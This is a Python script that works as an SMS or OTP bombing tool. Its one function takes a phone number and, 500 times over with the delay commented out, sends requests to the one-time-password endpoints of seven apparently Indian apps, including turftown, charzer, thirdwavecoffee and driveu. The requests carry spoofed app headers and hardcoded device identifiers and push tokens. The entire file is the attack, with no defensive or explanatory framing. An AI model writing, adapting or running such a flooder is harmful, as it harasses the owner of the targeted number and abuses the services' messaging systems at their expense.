import requests
import time

def smsgg(number):
    number = str(number)

    apis = [
        {
            "method": "POST",
            "url": "https://api.turftown.in/api/v2/user/send_otp",
            "headers": {
                "Host": "api.turftown.in",
                "accept": "application/json, text/plain, */*",
                "access-control-allow-origin": "*",
                "x-access-token": "",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.12"
            },
            "data": {"phone": number}
        },
        {
            "method": "POST",
            "url": f"https://resellme.work/UserEngine/UserLoginOTPServlet?phoneNumber={number}",
            "headers": {
                "deviceModel": "Samsung_SM-F7110",
                "androidId": "c7abc1fd7459e84c",
                "deviceId": "[116,56,40,-22,41,-70,123,30,-91,28,-86,-37,-22,60,31,-125,58,-78,53,-27,-11,-18,94,-38,5,-98,-14,96,-55,59,-92,-44]",
                "version": "722",
                "Host": "resellme.work",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.13"
            },
            "data": ""
        },
        {
            "method": "POST",
            "url": "https://animall.in/zap/auth/login",
            "headers": {
                "Host": "animall.in",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.11"
            },
            "data": {"phone": number, "signupPlatform": "NATIVE_ANDROID"}
        },
        {
            "method": "POST",
            "url": "https://api.charzer.com/auth-service/send-otp",
            "headers": {
                "Host": "api.charzer.com",
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {"appSource": "CHARZER_APP", "mobileNumber": number}
        },
        {
            "method": "POST",
            "url": "https://e2food.in/api/user/login.php",
            "headers": {
                "Host": "e2food.in",
                "authorization": "",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            },
            "data": {
                "mobile": f"+{number}",
                "fcm": "dQZMxOGfQKqy1Tsdou9Dat:APA91bEXJrEMss2ybfp5qFeoo--inrHXrq-XSmA4lp3oef1_nbVwgqdV0mr5T3OMzXLPzjmeRd21bYn92boie81mazcdhUrptLqccuo0QAxzWilP_k1UwyuqfMYB64Jom7KJyNw7ByYi",
                "version": "1.0.7",
                "device": "Samsung SM-F7110 samsung (14)"
            }
        },
        {
            "method": "POST",
            "url": "https://mobile-api.thirdwavecoffee.in/api/v1/sendOTP",
            "headers": {
                "Host": "mobile-api.thirdwavecoffee.in",
                "access_token": "",
                "version": "2.5.11",
                "devicetype": "android",
                "package_name": "in.thirdwavecoffee.android",
                "user_preferences": "",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {"phoneNumber": number}
        },
        {
            "method": "POST",
            "url": f"https://apps.driveu.in/profile/trigger-otp/?a_v=239&imei=006748ff-6047-4ff6-8c02-112b03f1457e&src=android&deviceDetails=Samsung%20SM-F7110&os_version=Android%20Version%20is%20%3A%2034%20(14)&androidDeviceId=c7abc1fd7459e84c&googleAdvertiserId=d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "apps.driveu.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.7.2"
            },
            "data": f"mobile={number}"
        }
    ]
    
    for _ in range(500):  # Reducing the number of iterations
        for api in apis:
            try:
                if api["method"] == "POST":
                    response = requests.post(api["url"], headers=api["headers"], json=api.get("data"))
                else:
                    response = requests.get(api["url"], headers=api["headers"])
                
                print(f"API {api['url']} response: {response.status_code}, {response.text}")
            except Exception as e:
                print(f"Error calling {api['url']}: {str(e)}")
            
          #  time.sleep(2)  # Adding a 2-second delay between requests

# Example 
